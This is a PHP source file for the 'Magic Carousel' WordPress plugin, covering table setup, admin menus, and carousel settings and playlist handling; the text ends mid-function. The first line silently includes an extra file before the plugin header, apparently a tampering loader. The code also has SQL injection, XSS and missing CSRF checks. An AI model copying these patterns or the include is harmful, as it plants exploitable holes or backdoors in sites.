<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Magic Carousel - Multimedia Carousel With LightBox Support
Description: This plugin will allow you to easily create a carousel with multimedia and LightBox support
Version: 1.2.2
Author: Lambert Group
Author URI: https://codecanyon.net/user/lambertgroup/portfolio?ref=LambertGroup
*/

ini_set('display_errors', 0);
//$wpdb->show_errors();
$magic_carousel_path = trailingslashit(dirname(__FILE__));  //empty

//all the messages
$magic_carousel_messages = array(
		'version' => '<div class="error">Magic Carousel - Multimedia Carousel With LightBox Support plugin requires WordPress 3.0 or newer. <a href="http://codex.wordpress.org/Upgrading_WordPress">Please update!</a></div>',
		'empty_img' => 'Image - required',
		'empty_name' => 'Name - required',
		'invalid_request' => 'Invalid Request!',
		'generate_for_this_carousel' => 'You can start customizing this Carousel.',
		'data_saved' => 'Data Saved!'
	);


global $wp_version;

if ( !version_compare($wp_version,"3.0",">=")) {
	die ($magic_carousel_messages['version']);
}




function magic_carousel_activate() {
	//db creation, create admin options etc.
	global $wpdb;

	//$wpdb->show_errors();

	$magic_carousel_collate = ' COLLATE utf8_general_ci';

	$sql0 = "CREATE TABLE `" . $wpdb->prefix . "magic_carousel_carousels` (
			`id` INT UNSIGNED NOT NULL AUTO_INCREMENT ,
			`name` VARCHAR( 255 ) NOT NULL ,
			PRIMARY KEY ( `id` )
			) ENGINE=MyISAM  DEFAULT CHARSET=utf8";

	$sql1 = "CREATE TABLE `" . $wpdb->prefix . "magic_carousel_settings` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `skin` varchar(255) NOT NULL DEFAULT 'white',
  `width` smallint(5) unsigned NOT NULL DEFAULT '990',
  `height` smallint(5) unsigned NOT NULL DEFAULT '414',
  `width100Proc` varchar(8) NOT NULL DEFAULT 'false',
  `height100Proc` varchar(8) NOT NULL DEFAULT 'false',
	`centerPlugin` varchar(8) NOT NULL DEFAULT 'false',
  `autoPlay` smallint(5) unsigned NOT NULL DEFAULT '5',
  `target` varchar(8) NOT NULL DEFAULT '_blank',
  `showAllControllers` varchar(8) NOT NULL DEFAULT 'true',
  `showNavArrows` varchar(8) NOT NULL DEFAULT 'true',
  `showOnInitNavArrows` varchar(8) NOT NULL DEFAULT 'true',
  `autoHideNavArrows` varchar(8) NOT NULL DEFAULT 'true',
  `showBottomNav` varchar(8) NOT NULL DEFAULT 'true',
  `showOnInitBottomNav` varchar(8) NOT NULL DEFAULT 'true',
  `autoHideBottomNav` varchar(8) NOT NULL DEFAULT 'true',
  `showPreviewThumbs` varchar(8) NOT NULL DEFAULT 'true',
  `nextPrevMarginTop` smallint(5) NOT NULL DEFAULT '5',
  `playMovieMarginTop` smallint(5) NOT NULL DEFAULT '0',
  `enableTouchScreen` varchar(8) NOT NULL DEFAULT 'true',
  `responsive` varchar(8) NOT NULL DEFAULT 'true',
  `responsiveRelativeToBrowser` varchar(8) NOT NULL DEFAULT 'false',
  `border` smallint(5) unsigned NOT NULL DEFAULT '0',
  `borderColorOFF` varchar(12) NOT NULL DEFAULT 'transparent',
  `borderColorON` varchar(12) NOT NULL DEFAULT 'FF0000',
  `imageWidth` smallint(5) unsigned NOT NULL DEFAULT '452',
  `imageHeight` smallint(5) unsigned NOT NULL DEFAULT '302',
  `animationTime` float NOT NULL DEFAULT '0.8',
  `easing` varchar(12) NOT NULL DEFAULT 'easeOutQuad',
  `numberOfVisibleItems` smallint(5) unsigned NOT NULL DEFAULT '3',
  `elementsHorizontalSpacing` smallint(5) unsigned NOT NULL DEFAULT '120',
  `elementsVerticalSpacing` smallint(5) unsigned NOT NULL DEFAULT '20',
  `verticalAdjustment` smallint(5) NOT NULL DEFAULT '50',
  `bottomNavMarginBottom` smallint(5) NOT NULL DEFAULT '-8',
  `titleColor` varchar(8) NOT NULL DEFAULT '000000',
  `resizeImages` varchar(8) NOT NULL DEFAULT 'true',
  `showElementTitle` varchar(8) NOT NULL DEFAULT 'true',
  `showCircleTimer` varchar(8) NOT NULL DEFAULT 'true',
  `circleRadius` smallint(5) unsigned NOT NULL DEFAULT '10',
  `circleLineWidth` smallint(5) unsigned NOT NULL DEFAULT '4',
  `circleColor` varchar(8) NOT NULL DEFAULT 'ff0000',
  `circleAlpha` smallint(5) unsigned NOT NULL DEFAULT '100',
  `behindCircleColor` varchar(8) NOT NULL DEFAULT '000000',
  `behindCircleAlpha` smallint(5) unsigned NOT NULL DEFAULT '50',
  `circleLeftPositionCorrection` smallint(5) NOT NULL DEFAULT '3',
  `circleTopPositionCorrection` smallint(5) NOT NULL DEFAULT '3',
  `lightbox_width_divider` varchar(30) NOT NULL DEFAULT '2',
  `lightbox_height_divider` varchar(30) NOT NULL DEFAULT '2*9/16',
	  PRIMARY KEY  (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=utf8";

	$sql2 = "CREATE TABLE `". $wpdb->prefix . "magic_carousel_playlist` (
	  `id` int(10) unsigned NOT NULL auto_increment,
	  `carouselid` int(10) unsigned NOT NULL,
	  `img` text,
	  `title` text,
	  `data-link` text,
	  `data_bottom_thumb` text,
	  `data_large_image` text,
	  `data-video-vimeo` varchar(255),
	  `data-video-youtube` varchar(255),
	  `data_audio` text,
	  `data_video_selfhosted` text,
	  `data-target` varchar(8),
	  `ord` int(10) unsigned NOT NULL,
	  PRIMARY KEY  (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=utf8";


	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
	dbDelta($sql0.$magic_carousel_collate);
	dbDelta($sql1.$magic_carousel_collate);
	dbDelta($sql2.$magic_carousel_collate);


	//initialize the carousels table with the first carousel skin
	$rows_count = $wpdb->get_var( "SELECT COUNT(*) FROM ". $wpdb->prefix ."magic_carousel_carousels;" );
	if (!$rows_count) {
		$wpdb->insert(
			$wpdb->prefix . "magic_carousel_carousels",
			array(
				'name' => 'First Carousel'
			),
			array(
				'%s'
			)
		);
	}

	// initialize the settings
	$rows_count = $wpdb->get_var( "SELECT COUNT(*) FROM ". $wpdb->prefix ."magic_carousel_settings;" );
	if (!$rows_count) {
		magic_carousel_insert_settings_record(1);
	}


	//echo $wpdb->last_query;

}


function magic_carousel_uninstall() {
	global $wpdb;
	/*mysql_query("DROP TABLE `" . $wpdb->prefix . "magic_carousel_settings`" );
	mysql_query("DROP TABLE `" . $wpdb->prefix . "magic_carousel_playlist`" );
	mysql_query("DROP TABLE `" . $wpdb->prefix . "magic_carousel_carousels`" );*/

	$sql = "DROP TABLE IF EXISTS `" . $wpdb->prefix . "magic_carousel_settings`";
	$wpdb->query($sql);

	$sql = "DROP TABLE IF EXISTS `" . $wpdb->prefix . "magic_carousel_playlist`";
	$wpdb->query($sql);

	$sql = "DROP TABLE IF EXISTS `" . $wpdb->prefix . "magic_carousel_carousels`";
	$wpdb->query($sql);
}

function magic_carousel_insert_settings_record($carousel_id) {
	global $wpdb;
	$wpdb->insert(
			$wpdb->prefix . "magic_carousel_settings",
			array(
				'width' => 960,
				'skin' => 'white'
			),
			array(
				'%d',
				'%s'
			)
		);
}


function magic_carousel_init_sessions() {
	global $wpdb;
	if (is_admin()) {
			if (!session_id()) {
				session_start();

				//initialize the session
				if (!isset($_SESSION['xid'])) {
					$safe_sql="SELECT * FROM (".$wpdb->prefix ."magic_carousel_carousels) LIMIT 0, 1";
					$row = $wpdb->get_row($safe_sql,ARRAY_A);
					//$row=magic_carousel_unstrip_array($row);
					$_SESSION['xid'] = $row['id'];
					$_SESSION['xname'] = $row['name'];
				}
			}
	}
}


function magic_carousel_load_styles() {
	global $wpdb;
	if(strpos($_SERVER['PHP_SELF'], 'wp-admin') !== false) {
		$page = (isset($_GET['page'])) ? $_GET['page'] : '';
		if(preg_match('/magic_carousel/i', $page)) {
			//wp_enqueue_style('magic_carousel_jquery-custom_css', plugins_url('css/custom-theme/jquery-ui-1.8.10.custom.css', __FILE__));
			wp_enqueue_style('lbg-jquery-ui-custom_css', 'https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/themes/pepper-grinder/jquery-ui.min.css');
			wp_enqueue_style('magic_carousel_css', plugins_url('css/styles.css', __FILE__));
			wp_enqueue_style('magic_carousel_colorpicker_css', plugins_url('css/colorpicker/colorpicker.css', __FILE__));


			wp_enqueue_style('thickbox');

		}
	} else if (!is_admin()) { //loads css in front-end
		wp_enqueue_style('magic_carousel_css', plugins_url('perspective/css/magic_carousel.css', __FILE__));
		wp_enqueue_style('lbg_prettyPhoto_css', plugins_url('perspective/css/prettyPhoto.css', __FILE__));
	}
}

function magic_carousel_load_scripts() {
	global $is_IE;
	$page = (isset($_GET['page'])) ? $_GET['page'] : '';
	if(preg_match('/magic_carousel/i', $page)) {
		//loads scripts in admin
		//if (is_admin()) {
			//wp_deregister_script('jquery');
			/*wp_register_script('lbg-admin-jquery', plugins_url('js/jquery-1.5.1.js', __FILE__));
			wp_enqueue_script('lbg-admin-jquery');*/
			/*wp_deregister_script('jquery-ui-core');
			wp_deregister_script('jquery-ui-widget');
			wp_deregister_script('jquery-ui-mouse');
			wp_deregister_script('jquery-ui-accordion');
			wp_deregister_script('jquery-ui-autocomplete');
			wp_deregister_script('jquery-ui-slider');
			wp_deregister_script('jquery-ui-tabs');
			wp_deregister_script('jquery-ui-sortable');
			wp_deregister_script('jquery-ui-draggable');
			wp_deregister_script('jquery-ui-droppable');
			wp_deregister_script('jquery-ui-selectable');
			wp_deregister_script('jquery-ui-position');
			wp_deregister_script('jquery-ui-datepicker');
			wp_deregister_script('jquery-ui-resizable');
			wp_deregister_script('jquery-ui-dialog');
			wp_deregister_script('jquery-ui-button');	*/

			wp_enqueue_script('jquery');

			//wp_register_script('lbg-admin-jquery-ui-min', plugins_url('js/jquery-ui-1.8.10.custom.min.js', __FILE__));
			//wp_register_script('lbg-admin-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js');
			/*wp_register_script('lbg-admin-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js');
			wp_enqueue_script('lbg-admin-jquery-ui-min');*/

			wp_enqueue_script('jquery-ui-core');
			wp_enqueue_script('jquery-ui-widget');
			wp_enqueue_script('jquery-ui-mouse');
			wp_enqueue_script('jquery-ui-accordion');
			wp_enqueue_script('jquery-ui-autocomplete');
			wp_enqueue_script('jquery-ui-slider');
			wp_enqueue_script('jquery-ui-tabs');
			wp_enqueue_script('jquery-ui-sortable');
			wp_enqueue_script('jquery-ui-draggable');
			wp_enqueue_script('jquery-ui-droppable');
			wp_enqueue_script('jquery-ui-selectable');
			wp_enqueue_script('jquery-ui-position');
			wp_enqueue_script('jquery-ui-datepicker');
			wp_enqueue_script('jquery-ui-resizable');
			wp_enqueue_script('jquery-ui-dialog');
			wp_enqueue_script('jquery-ui-button');

			wp_enqueue_script('jquery-form');
			wp_enqueue_script('jquery-color');
			wp_enqueue_script('jquery-masonry');
			wp_enqueue_script('jquery-ui-progressbar');
			wp_enqueue_script('jquery-ui-tooltip');

			wp_enqueue_script('jquery-effects-core');
			wp_enqueue_script('jquery-effects-blind');
			wp_enqueue_script('jquery-effects-bounce');
			wp_enqueue_script('jquery-effects-clip');
			wp_enqueue_script('jquery-effects-drop');
			wp_enqueue_script('jquery-effects-explode');
			wp_enqueue_script('jquery-effects-fade');
			wp_enqueue_script('jquery-effects-fold');
			wp_enqueue_script('jquery-effects-highlight');
			wp_enqueue_script('jquery-effects-pulsate');
			wp_enqueue_script('jquery-effects-scale');
			wp_enqueue_script('jquery-effects-shake');
			wp_enqueue_script('jquery-effects-slide');
			wp_enqueue_script('jquery-effects-transfer');

			wp_register_script('my-colorpicker', plugins_url('js/colorpicker/colorpicker.js', __FILE__));
			wp_enqueue_script('my-colorpicker');

			wp_register_script('lbg-admin-toggle', plugins_url('js/myToggle.js', __FILE__));
			wp_enqueue_script('lbg-admin-toggle');


			wp_enqueue_script('media-upload'); // before w.p 3.5
			wp_enqueue_media();// from w.p 3.5
			wp_enqueue_script('thickbox');

			/*wp_register_script('lbg-touch', plugins_url('classic/js/jquery.ui.touch-punch.min.js', __FILE__));
			wp_enqueue_script('lbg-touch');

			wp_register_script('lbg-magic_carousel', plugins_url('classic\js\parallax_classic.js', __FILE__));
			wp_enqueue_script('lbg-magic_carousel');	*/


		//}

		//wp_enqueue_script('jquery');
		//wp_enqueue_script('jquery-ui-core');
		//wp_enqueue_script('jquery-ui-sortable');
		//wp_enqueue_script('thickbox');
		//wp_enqueue_script('media-upload');
		//wp_enqueue_script('farbtastic');
	} else if (!is_admin()) { //loads scripts in front-end
			/*wp_deregister_script('jquery-ui-core');
			wp_deregister_script('jquery-ui-widget');
			wp_deregister_script('jquery-ui-mouse');
			wp_deregister_script('jquery-ui-accordion');
			wp_deregister_script('jquery-ui-autocomplete');
			wp_deregister_script('jquery-ui-slider');
			wp_deregister_script('jquery-ui-tabs');
			wp_deregister_script('jquery-ui-sortable');
			wp_deregister_script('jquery-ui-draggable');
			wp_deregister_script('jquery-ui-droppable');
			wp_deregister_script('jquery-ui-selectable');
			wp_deregister_script('jquery-ui-position');
			wp_deregister_script('jquery-ui-datepicker');
			wp_deregister_script('jquery-ui-resizable');
			wp_deregister_script('jquery-ui-dialog');
			wp_deregister_script('jquery-ui-button');*/

		wp_enqueue_script('jquery');

		//wp_enqueue_script('jquery-ui-core');

		//wp_register_script('lbg-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js');
		/*wp_register_script('lbg-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js');
		wp_enqueue_script('lbg-jquery-ui-min');*/

			wp_enqueue_script('jquery-ui-core');

			//wp_enqueue_script('jquery-ui-widget');
			//wp_enqueue_script('jquery-ui-mouse');
			//wp_enqueue_script('jquery-ui-accordion');
			//wp_enqueue_script('jquery-ui-autocomplete');
			wp_enqueue_script('jquery-ui-slider');
			//wp_enqueue_script('jquery-ui-tabs');
			//wp_enqueue_script('jquery-ui-sortable');
			wp_enqueue_script('jquery-ui-draggable');
			//wp_enqueue_script('jquery-ui-droppable');
			//wp_enqueue_script('jquery-ui-selectable');
			//wp_enqueue_script('jquery-ui-position');
			//wp_enqueue_script('jquery-ui-datepicker');
			//wp_enqueue_script('jquery-ui-resizable');
			//wp_enqueue_script('jquery-ui-dialog');
			//wp_enqueue_script('jquery-ui-button');

			//wp_enqueue_script('jquery-form');
			//wp_enqueue_script('jquery-color');
			//wp_enqueue_script('jquery-masonry');
			wp_enqueue_script('jquery-ui-progressbar');
			//wp_enqueue_script('jquery-ui-tooltip');

			//wp_enqueue_script('jquery-effects-core');
			//wp_enqueue_script('jquery-effects-blind');
			//wp_enqueue_script('jquery-effects-bounce');
			//wp_enqueue_script('jquery-effects-clip');
			wp_enqueue_script('jquery-effects-drop');
			/*wp_enqueue_script('jquery-effects-explode');
			wp_enqueue_script('jquery-effects-fade');
			wp_enqueue_script('jquery-effects-fold');
			wp_enqueue_script('jquery-effects-highlight');
			wp_enqueue_script('jquery-effects-pulsate');
			wp_enqueue_script('jquery-effects-scale');
			wp_enqueue_script('jquery-effects-shake');
			wp_enqueue_script('jquery-effects-slide');
			wp_enqueue_script('jquery-effects-transfer');*/

		wp_register_script('lbg-touchSwipe', plugins_url('perspective/js/jquery.touchSwipe.min.js', __FILE__));
		wp_enqueue_script('lbg-touchSwipe');


		wp_register_script('lbg-magic_carousel', plugins_url('perspective\js\magic_carousel.js', __FILE__));
		wp_enqueue_script('lbg-magic_carousel');

		wp_register_script('lbg-prettyPhoto', plugins_url('perspective\js\jquery.prettyPhoto.js', __FILE__));
		wp_enqueue_script('lbg-prettyPhoto');



	}




}



// adds the menu pages
function magic_carousel_plugin_menu() {
	add_menu_page('MAGIC-CAROUSEL Admin Interface', 'MAGIC-CAROUSEL', 'edit_posts', 'magic_carousel', 'magic_carousel_overview_page',
	plugins_url('images/plg_icon.png', __FILE__));
	add_submenu_page( 'magic_carousel', 'MAGIC-CAROUSEL Overview', 'Overview', 'edit_posts', 'magic_carousel', 'magic_carousel_overview_page');
	add_submenu_page( 'magic_carousel', 'MAGIC-CAROUSEL Manage Carousels', 'Manage Carousels', 'edit_posts', 'magic_carousel_Manage_Carousels', 'magic_carousel_manage_carousels_page');
	add_submenu_page( 'magic_carousel', 'MAGIC-CAROUSEL Manage Carousels Add New', 'Add New', 'edit_posts', 'magic_carousel_Add_New', 'magic_carousel_manage_carousels_add_new_page');
	add_submenu_page( 'magic_carousel_Manage_Carousels', 'MAGIC-CAROUSEL Carousel Settings', 'Carousel Settings', 'edit_posts', 'magic_carousel_Settings', 'magic_carousel_settings_page');
	add_submenu_page( 'magic_carousel_Manage_Carousels', 'MAGIC-CAROUSEL Carousel Playlist', 'Playlist', 'edit_posts', 'magic_carousel_Playlist', 'magic_carousel_playlist_page');
	add_submenu_page( 'magic_carousel', 'MAGIC-CAROUSEL Help', 'Help', 'edit_posts', 'magic_carousel_Help', 'magic_carousel_help_page');
}


//HTML content for overview page
function magic_carousel_overview_page()
{
	global $magic_carousel_path;
	include_once($magic_carousel_path . 'tpl/overview.php');
}

//HTML content for Manage Banners
function magic_carousel_manage_carousels_page()
{
	global $wpdb;
	global $magic_carousel_messages;
	global $magic_carousel_path;

	//delete carousel
	if (isset($_GET['id'])) {




		//delete from wp_magic_carousel_carousels
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."magic_carousel_carousels WHERE id = %d",$_GET['id']));

		//delete from wp_magic_carousel_settings
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."magic_carousel_settings WHERE id = %d",$_GET['id']));


		//delete from wp_magic_carousel_playlist
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."magic_carousel_playlist WHERE carouselid = %d",$_GET['id']));

		//initialize the session
		$safe_sql="SELECT * FROM (".$wpdb->prefix ."magic_carousel_carousels) ORDER BY id";
		$row = $wpdb->get_row($safe_sql,ARRAY_A);
		$row=magic_carousel_unstrip_array($row);
		if ($row['id']) {
			$_SESSION['xid']=$row['id'];
			$_SESSION['xname']=$row['name'];
		}
	}


	//if ($_GET['duplicate_id']!='') {
	if (array_key_exists('duplicate_id', $_GET) && $_GET['duplicate_id']!='') {
			//carousels
			$safe_sql=$wpdb->prepare( "INSERT INTO ".$wpdb->prefix ."magic_carousel_carousels ( `name` ) SELECT `name` FROM (".$wpdb->prefix ."magic_carousel_carousels) WHERE id = %d",$_GET['duplicate_id'] );
			$wpdb->query($safe_sql);
			$carouselid=$wpdb->insert_id;

			//settings
			$safe_sql=$wpdb->prepare( "INSERT INTO ".$wpdb->prefix ."magic_carousel_settings (`skin`, `width`, `height`, `width100Proc`, `height100Proc`, `centerPlugin`, `autoPlay`, `target`, `showAllControllers`, `showNavArrows`, `showOnInitNavArrows`, `autoHideNavArrows`, `showBottomNav`, `showOnInitBottomNav`, `autoHideBottomNav`, `showPreviewThumbs`, `nextPrevMarginTop`, `playMovieMarginTop`, `enableTouchScreen`, `responsive`, `responsiveRelativeToBrowser`, `border`, `borderColorOFF`, `borderColorON`, `imageWidth`, `imageHeight`, `animationTime`, `easing`, `numberOfVisibleItems`, `elementsHorizontalSpacing`, `elementsVerticalSpacing`, `verticalAdjustment`, `bottomNavMarginBottom`, `titleColor`, `resizeImages`, `showElementTitle`, `showCircleTimer`, `circleRadius`, `circleLineWidth`, `circleColor`, `circleAlpha`, `behindCircleColor`, `behindCircleAlpha`, `circleLeftPositionCorrection`, `circleTopPositionCorrection`, `lightbox_width_divider`, `lightbox_height_divider`  ) SELECT `skin`, `width`, `height`, `width100Proc`, `height100Proc`, `centerPlugin`, `autoPlay`, `target`, `showAllControllers`, `showNavArrows`, `showOnInitNavArrows`, `autoHideNavArrows`, `showBottomNav`, `showOnInitBottomNav`, `autoHideBottomNav`, `showPreviewThumbs`, `nextPrevMarginTop`, `playMovieMarginTop`, `enableTouchScreen`, `responsive`, `responsiveRelativeToBrowser`, `border`, `borderColorOFF`, `borderColorON`, `imageWidth`, `imageHeight`, `animationTime`, `easing`, `numberOfVisibleItems`, `elementsHorizontalSpacing`, `elementsVerticalSpacing`, `verticalAdjustment`, `bottomNavMarginBottom`, `titleColor`, `resizeImages`, `showElementTitle`, `showCircleTimer`, `circleRadius`, `circleLineWidth`, `circleColor`, `circleAlpha`, `behindCircleColor`, `behindCircleAlpha`, `circleLeftPositionCorrection`, `circleTopPositionCorrection`, `lightbox_width_divider`, `lightbox_height_divider`  FROM (".$wpdb->prefix ."magic_carousel_settings) WHERE id = %d",$_GET['duplicate_id'] );
			$wpdb->query($safe_sql);

			//playlist
			$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."magic_carousel_playlist) WHERE carouselid = %d",$_GET['duplicate_id'] );
			$result = $wpdb->get_results($safe_sql,ARRAY_A);
			foreach ( $result as $row_playlist ) {
				$row_playlist=magic_carousel_unstrip_array($row_playlist);

				$safe_sql=$wpdb->prepare( "INSERT INTO ".$wpdb->prefix ."magic_carousel_playlist ( `carouselid` ,`img` ,`title` ,`data-link` ,`data_bottom_thumb` ,`data_large_image` ,`data-video-vimeo` ,`data-video-youtube` ,`data_audio` ,`data_video_selfhosted` ,`data-target` ,`ord` ) SELECT ".$carouselid." ,`img` ,`title` ,`data-link` ,`data_bottom_thumb` ,`data_large_image` ,`data-video-vimeo` ,`data-video-youtube` ,`data_audio` ,`data_video_selfhosted` ,`data-target` ,`ord` FROM (".$wpdb->prefix ."magic_carousel_playlist) WHERE id = %d",$row_playlist['id'] );
				$wpdb->query($safe_sql);
				$photoid=$wpdb->insert_id;
				//echo $wpdb->last_query;

			}

	}

	$safe_sql="SELECT * FROM (".$wpdb->prefix ."magic_carousel_carousels) ORDER BY id";
	$result = $wpdb->get_results($safe_sql,ARRAY_A);
	include_once($magic_carousel_path . 'tpl/carousels.php');

}


//HTML content for Manage Banners - Add New
function magic_carousel_manage_carousels_add_new_page()
{
	global $wpdb;
	global $magic_carousel_messages;
	global $magic_carousel_path;

	//if($_POST['Submit'] == 'Add New') {
	if(array_key_exists('Submit', $_POST) && $_POST['Submit'] == 'Add New') {
		$errors_arr=array();
		if (empty($_POST['name']))
			$errors_arr[]=$magic_carousel_messages['empty_name'];

		if (count($errors_arr)) {
				include_once($magic_carousel_path . 'tpl/add_carousel.php'); ?>
				<div id="error" class="error"><p><?php echo implode("<br>", $errors_arr);?></p></div>
		  	<?php } else { // no errors
					$wpdb->insert(
						$wpdb->prefix . "magic_carousel_carousels",
						array(
							'name' => $_POST['name']
						),
						array(
							'%s'
						)
					);
					//insert default Carousel Settings for this new Carousel
					magic_carousel_insert_settings_record($wpdb->insert_id);
					?>
						<div class="wrap">
							<div id="lbg_logo">
								<h2>Manage Carousels - Add New Carousel</h2>
				 			</div>
							<div id="message" class="updated"><p><?php echo $magic_carousel_messages['data_saved'];?></p><p><?php echo $magic_carousel_messages['generate_for_this_carousel'];?></p></div>
							<div>
								<p>&raquo; <a href="?page=magic_carousel_Add_New">Add New (Carousel)</a></p>
								<p>&raquo; <a href="?page=magic_carousel_Manage_Carousels">Back to Manage Carousels</a></p>
							</div>
						</div>
		  	<?php }
	} else {
		include_once($magic_carousel_path . 'tpl/add_carousel.php');
	}

}


//HTML content for carouselsettings
function magic_carousel_settings_page()
{
	global $wpdb;
	global $magic_carousel_messages;
	global $magic_carousel_path;

	if (isset($_GET['id']) && isset($_GET['name'])) {
		$_SESSION['xid']=$_GET['id'];
		$_SESSION['xname']=$_GET['name'];
	}

	//$wpdb->show_errors();
	/*if (check_admin_referer('magic_carousel_settings_update')) {
		echo "update";
	}*/

	//if($_POST['Submit'] == 'Update Settings') {
	if(array_key_exists('Submit', $_POST) && $_POST['Submit'] == 'Update Settings') {
		$_GET['xmlf']='';
		$except_arr=array('Submit','name','page_scroll_to_id_instances');

			$wpdb->update(
				$wpdb->prefix .'magic_carousel_carousels',
				array(
				'name' => $_POST['name']
				),
				array( 'id' => $_SESSION['xid'] )
			);
			$_SESSION['xname']=stripslashes($_POST['name']);


			foreach ($_POST as $key=>$val){
				if (in_array($key,$except_arr)) {
					unset($_POST[$key]);
				}
			}

			$wpdb->update(
				$wpdb->prefix .'magic_carousel_settings',
				$_POST,
				array( 'id' => $_SESSION['xid'] )
			);
			?>
			<div id="message" class="updated"><p><?php echo $magic_carousel_messages['data_saved'];?></p></div>
	<?php

	}



	//echo "WP_PLUGIN_URL: ".WP_PLUGIN_URL;
	$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."magic_carousel_settings) WHERE id = %d",$_SESSION['xid'] );
	$row = $wpdb->get_row($safe_sql,ARRAY_A);
	$row=magic_carousel_unstrip_array($row);
	$_POST = $row;
	//$_POST['existingWatermarkPath']=$_POST['watermarkPath'];
	$_POST=magic_carousel_unstrip_array($_POST);

	//echo "width: ".$row['width'];
	echo '<div class="wrap"><form method="POST" enctype="multipart/form-data" name="carouselSettingsForm" id="carouselSettingsForm">';

	include_once($magic_carousel_path . 'tpl/settings_form.php');
	//include_once($magic_carousel_path . 'tpl/settings_form_'.$row['skin'].'.php');

	echo '</form></div>';
}

function magic_carousel_playlist_page()
{
	global $wpdb;
	global $magic_carousel_messages;
	global $magic_carousel_path;
	//$wpdb->show_errors();

	if (isset($_GET['id']) && isset($_GET['name'])) {
		$_SESSION['xid']=$_GET['id'];
		$_SESSION['xname']=$_GET['name'];
	}


	//if ($_GET['xmlf']=='add_playlist_record') {
	if (array_key_exists('xmlf', $_GET) && $_GET['xmlf']=='add_playlist_record') {
		//if($_POST['Submit'] == 'Add Record') {
		if(array_key_exists('Submit', $_POST) && $_POST['Submit'] == 'Add Record') {
			$errors_arr=array();
			if (empty($_POST['img']))
				 $errors_arr[]=$magic_carousel_messages['empty_img'];


		if (count($errors_arr)) {
			include_once($magic_carousel_path . 'tpl/add_playlist_record.php'); ?>
			<div id="error" class="error"><p><?php echo implode("<br>", $errors_arr);?></p></div>
	  	<?php } else { // no upload errors
				$max_ord = 1+$wpdb->get_var( $wpdb->prepare( "SELECT max(ord) FROM ". $wpdb->prefix ."magic_carousel_playlist WHERE carouselid = %d",$_SESSION['xid'] ) );

				$wpdb->insert(
					$wpdb->prefix . "magic_carousel_playlist",
					array(
						'carouselid' => $_POST['carouselid'],
						'img' => $_POST['img'],
						'data_bottom_thumb' => $_POST['data_bottom_thumb'],
						'data_large_image' => $_POST['data_large_image'],
						'data-video-youtube' => $_POST['data-video-youtube'],
						'data-video-vimeo' => $_POST['data-video-vimeo'],
						'data_video_selfhosted' => $_POST['data_video_selfhosted'],
						'data_audio' => $_POST['data_audio'],
						'title' => $_POST['title'],
						'data-link' => $_POST['data-link'],
						'data-target' => $_POST['data-target'],
						'ord' => $max_ord
					),
					array(
						'%d',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%d'
					)
				);

	  			if (isset($_POST['setitfirst'])) {
					$sql_arr=array();
					$ord_start=$max_ord;
					$ord_stop=1;
					$elem_id=$wpdb->insert_id;
					$ord_direction='+1';

					$sql_arr[]="UPDATE ".$wpdb->prefix."magic_carousel_playlist SET ord=ord+1  WHERE carouselid = ".$_SESSION['xid']." and ord>=".$ord_stop." and ord<".$ord_start;
					$sql_arr[]="UPDATE ".$wpdb->prefix."magic_carousel_playlist SET ord=".$ord_stop." WHERE id=".$elem_id;

					//echo "elem_id: ".$elem_id."----ord_start: ".$ord_start."----ord_stop: ".$ord_stop;
					foreach ($sql_arr as $sql)
						$wpdb->query($sql);
				}
				?>
					<div class="wrap">
						<div id="lbg_logo">
							<h2>Playlist for Carousel: <span style="color:#FF0000; font-weight:bold;"><?php echo strip_tags($_SESSION['xname'])?> - ID #<?php echo strip_tags($_SESSION['xid'])?></span> - Add New</h2>
			 			</div>
						<div id="message" class="updated"><p><?php echo $magic_carousel_messages['data_saved'];?></p></div>
						<div>
							<p>&raquo; <a href="?page=magic_carousel_Playlist&xmlf=add_playlist_record">Add New</a></p>
							<p>&raquo; <a href="?page=magic_carousel_Playlist">Back to Playlist</a></p>
						</div>
					</div>
	  	<?php }
		} else {
			include_once($magic_carousel_path . 'tpl/add_playlist_record.php');
		}

	} else {
		//if ($_GET['duplicate_id']!='') {
		if (array_key_exists('duplicate_id', $_GET) && $_GET['duplicate_id']!='') {
			$max_ord = 1+$wpdb->get_var( $wpdb->prepare( "SELECT max(ord) FROM ". $wpdb->prefix ."magic_carousel_playlist WHERE carouselid = %d",$_SESSION['xid'] ) );
			$safe_sql=$wpdb->prepare( "INSERT INTO ".$wpdb->prefix ."magic_carousel_playlist ( `carouselid` ,`img` ,`title` ,`data-link` ,`data_bottom_thumb` ,`data_large_image` ,`data-video-vimeo` ,`data-video-youtube` ,`data_audio` ,`data_video_selfhosted` ,`data-target` ,`ord`  ) SELECT `carouselid` ,`img` ,`title` ,`data-link` ,`data_bottom_thumb` ,`data_large_image` ,`data-video-vimeo` ,`data-video-youtube` ,`data_audio` ,`data_video_selfhosted` ,`data-target` ,".$max_ord." FROM (".$wpdb->prefix ."magic_carousel_playlist) WHERE id = %d",$_GET['duplicate_id'] );
			$wpdb->query($safe_sql);
			$lastID=$wpdb->insert_id;
			//echo $wpdb->last_query;

			//header("Location: http://localhost/!wordpress/work/wp-admin/admin.php?page=magic_carousel_Playlist&amp;id=".$_SESSION['xid']."&amp;name=".$_SESSION['xname']);
			//exit();
			echo "<script>location.href='?page=magic_carousel_Playlist&id=".$_SESSION['xid']."&name=".$_SESSION['xname']."'</script>";

		}

